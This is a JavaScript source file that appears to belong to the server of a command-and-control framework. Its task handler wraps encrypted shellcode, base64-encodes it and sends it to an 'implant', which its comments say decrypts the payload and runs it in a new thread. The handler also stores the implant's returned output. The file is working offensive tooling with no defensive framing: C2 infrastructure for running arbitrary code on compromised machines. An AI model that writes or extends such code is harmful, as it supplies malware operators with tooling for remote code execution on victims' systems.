// Shellcode Load (Inline) Task Handler
// Sends: task_id:base64("SHELLCODE_INLINE:<base64_ciphertext>")
// The payload is AES-256-CBC encrypted by the CLI before dispatch.
// Implant decodes, decrypts with its own key/IV, and executes in a new thread.
export class TaskHandler {
  constructor(task) {
    this.task = task
  }

  getTask = async function (req, res) {
    const { payload }   = JSON.parse(this.task.parameters)
    const instruction   = `SHELLCODE_INLINE:${payload}`
    const encoded       = `${this.task.id}:${Buffer.from(instruction).toString('base64')}`
    const kb            = Math.round(Buffer.from(payload, 'base64').length / 1024)
    const display       = `Shellcode Load (inline, ${kb} KB encrypted)`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display })
    this.task.display = display
    res.send(encoded)
  }

  taskIO = async function (req, res) {
    this.task.output      = Buffer.from(req.body, 'base64').toString('utf8')
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
